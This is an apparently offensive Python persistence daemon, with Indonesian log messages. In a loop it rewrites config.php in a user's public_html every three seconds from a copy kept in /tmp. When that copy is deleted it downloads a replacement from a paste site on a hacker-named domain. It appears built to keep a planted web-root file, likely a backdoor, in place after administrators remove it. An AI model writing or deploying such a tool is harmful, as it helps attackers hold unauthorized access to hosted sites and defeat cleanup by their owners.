#!/usr/bin/env python3
import os
import sys
import time
import stat
import shutil
import errno
import hashlib
import subprocess
from datetime import datetime

SRC_FILE = "/tmp/config.php"
DST_FILE = "/home/smoky/public_html/config.php"
SLEEP_SEC = 3
TMP_SUFFIX = ".restore_tmp"
DOWNLOAD_URL = "https://paste.haxor-research.com/raw/smokyganteng"
CURL_CMD = "/usr/bin/curl"

def logmsg(fmt, *args):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    sys.stderr.write("[%s] %s\n" % (ts, fmt % args if args else fmt))
    sys.stderr.flush()

def mkdir_p(path, mode=0o755):
    try:
        os.makedirs(path, mode=mode, exist_ok=True)
        os.chmod(path, mode)
    except Exception as e:
        return False, str(e)
    return True, None

def files_equal(a, b):
    try:
        sa = os.stat(a)
        sb = os.stat(b)
    except OSError:
        return None  

    if sa.st_size != sb.st_size:
        return False

    try:
        with open(a, "rb") as fa, open(b, "rb") as fb:
            while True:
                ba = fa.read(8192)
                if not ba:
                    break
                bb = fb.read(len(ba))
                if ba != bb:
                    return False
    except Exception:
        return None
    return True

def atomic_copy(src, dst):
    """
    Copy src -> dst atomically using tmp file named dst+TMP_SUFFIX
    Preserves file mode from src.
    Returns 0 on success, negative on error.
    """
    try:
        st = os.stat(src)
    except OSError as e:
        return -1, "stat(src): %s" % e

    tmp = dst + TMP_SUFFIX + ".%d" % os.getpid()
    tmp_dir = os.path.dirname(dst) or "."

    ok, err = mkdir_p(tmp_dir, mode=0o755)
    if not ok:
        return -2, "mkdir_p: %s" % err

    try:
        with open(src, "rb") as fsrc, open(tmp, "wb") as fdst:
            # copy loop
            while True:
                chunk = fsrc.read(8192)
                if not chunk:
                    break
                fdst.write(chunk)
            fdst.flush()
            os.fsync(fdst.fileno())
    except Exception as e:
        try:
            os.unlink(tmp)
        except Exception:
            pass
        return -3, "copy/write error: %s" % e

    try:
        os.chmod(tmp, st.st_mode & 0o777)
    except Exception as e:
        logmsg("Warning: chmod(tmp) failed: %s", e)

    try:
        os.replace(tmp, dst)
    except Exception as e:
        try:
            os.unlink(tmp)
        except Exception:
            pass
        return -4, "rename failed: %s" % e

    return 0, None

def try_redownload_source():
    if not DOWNLOAD_URL:
        return False, "no-download-url"
    curl = CURL_CMD if os.path.exists(CURL_CMD) else shutil.which("curl")
    if curl:
        cmd = [curl, "-s", "-L", "-o", SRC_FILE, DOWNLOAD_URL]
        logmsg("Sumber tidak ditemukan. Mencoba download ulang dari %s", DOWNLOAD_URL)
        try:
            rc = subprocess.call(cmd)
            if rc == 0:
                return True, None
            else:
                return False, "curl rc=%d" % rc
        except Exception as e:
            return False, str(e)
    else:
        logmsg("curl tidak ditemukan, mencoba fallback urllib")
        try:
            import urllib.request
            tmp = SRC_FILE + ".dltmp.%d" % os.getpid()
            with urllib.request.urlopen(DOWNLOAD_URL, timeout=30) as r:
                with open(tmp, "wb") as w:
                    shutil.copyfileobj(r, w)
            os.replace(tmp, SRC_FILE)
            return True, None
        except Exception as e:
            return False, str(e)

def main():
    logmsg("Restore daemon started: %s -> %s (interval %d sec)", SRC_FILE, DST_FILE, SLEEP_SEC)

    while True:
        dst_dir = os.path.dirname(DST_FILE)
        if dst_dir and not os.path.exists(dst_dir):
            ok, err = mkdir_p(dst_dir, mode=0o755)
            if not ok:
                logmsg("Gagal membuat direktori %s: %s", dst_dir, err)
                time.sleep(SLEEP_SEC)
                continue
            else:
                logmsg("Direktori tujuan dibuat: %s", dst_dir)

        if not os.path.exists(SRC_FILE):
            logmsg("File sumber %s tidak ditemukan.", SRC_FILE)
            if DOWNLOAD_URL:
                ok, err = try_redownload_source()
                if ok:
                    logmsg("Download sumber berhasil.")
                else:
                    logmsg("Download sumber gagal: %s", err)
            time.sleep(SLEEP_SEC)
            continue

        do_copy = True
        if os.path.exists(DST_FILE):
            eq = files_equal(SRC_FILE, DST_FILE)
            if eq is True:
                logmsg("Sumber identik dengan tujuan; skip menimpa.")
                do_copy = False
            elif eq is False:
                do_copy = True
            else:
                logmsg("Gagal membandingkan file; akan coba overwrite.")
                do_copy = True

        if do_copy:
            rc, err = atomic_copy(SRC_FILE, DST_FILE)
            if rc == 0:
                logmsg("Berhasil restore %s -> %s", SRC_FILE, DST_FILE)
            else:
                logmsg("Gagal restore (code %d): %s", rc, err)

        time.sleep(SLEEP_SEC)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logmsg("Stopping by user request.")
        sys.exit(0)
